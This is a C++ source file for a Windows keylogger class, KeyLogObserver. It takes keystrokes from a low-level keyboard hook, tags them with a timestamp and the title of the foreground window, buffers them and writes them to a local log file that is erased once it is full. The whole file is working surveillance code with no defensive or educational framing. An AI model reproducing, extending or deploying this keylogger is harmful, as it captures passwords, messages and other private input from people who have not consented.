#include "KeyLogObserver.hpp"
#include "Keyboard.hpp"
#include <log/Log.hpp>
#include <system/File.hpp>

namespace Keyboard
{
	KeyLogObserver::KeyLogObserver(const std::string& logFilePathArg) : 
		logFilePath(logFilePathArg),
		currentWindow(L"undefined"),
		bufferedChar(0),
		deadChar(0)
	{
		kbdLibrary = loadKeyboardLayout();
	}

	KeyLogObserver::~KeyLogObserver()
	{
		unloadKeyboardLayout(kbdLibrary);
		flush();
	}

	void KeyLogObserver::update(const KeyInformation& ki)
	{
		KBDLLHOOKSTRUCT hooked = ki.hooked;
		nChar = convertVirtualKeyToWChar(hooked.vkCode, (PWCHAR)&outputChar, (PWCHAR)&deadChar);
		
		if(nChar > 0)
		{
			addKey(&outputChar);
		}
	}

    void KeyLogObserver::clearLogFile()
	{
	    remove(logFilePath.c_str());
	}
	
    void KeyLogObserver::setKeylog(const std::string& logFilePathArg)
    {
        logFilePath = logFilePathArg;
    }
    	
	const std::string& KeyLogObserver::getLogFilePath()
	{
		return logFilePath;
	}

	void KeyLogObserver::flush()
    {
        TRACE_FUNCTION
		LOG << "Flushing to " + logFilePath;
        logFile.open(logFilePath.c_str(), std::fstream::out | std::fstream::app);
        if(logFile)
        {
            for(std::map<std::wstring, std::wstring>::iterator iter = logBuffer.begin();
                iter != logBuffer.end();
                iter++)
            {
                logFile << iter->first << " => " << iter->second << "\n";
            }
			std::streamoff filesize = System::Size(logFile);
            logFile.close();
            logBuffer.clear();
			bufferedChar = 0;
            
            if(filesize >= LOGFILE_MAX_SIZE)
            {
                LOG << "Log file is full. Erasing.";
                clearLogFile();
            }
        }
        else
        {
            LOG << "Error while flushing to " + logFilePath + ", cause : " + strerror(errno);
        }
    }
    
    void KeyLogObserver::addKey(PWCHAR key)
    {
        TRACE_FUNCTION
        
		LOG << "Key : " + Common::toString(std::wstring(key));

		WCHAR currentWindowBuffer[MAX_TITLE_SIZE];
        HWND windowHandle = GetForegroundWindow();
        GetWindowTextW(windowHandle, currentWindowBuffer, MAX_TITLE_SIZE);
        std::wstring currentWindowTemp = currentWindowBuffer;

		LOG << "Current window : " + Common::toString(currentWindow);
		LOG << "Window detected : " + Common::toString(currentWindowTemp);
		if(currentWindowTemp != currentWindow)
		{
			std::string currentTime = Common::currentTime();
			std::wstring wCurrentTime(currentTime.begin(), currentTime.end());
			currentWindowIndex = wCurrentTime + L" " + currentWindowTemp;
			currentWindow = currentWindowTemp;
		}
		
		std::wstring nextWindowIndex = currentWindowIndex;
        logBuffer[nextWindowIndex] += *key;
		bufferedChar++;
		LOG << "Window => " + Common::toString(nextWindowIndex);
		if(bufferedChar >= MAX_BUFFERED)
		{
			flush();
		}
    }
} // Keyboard
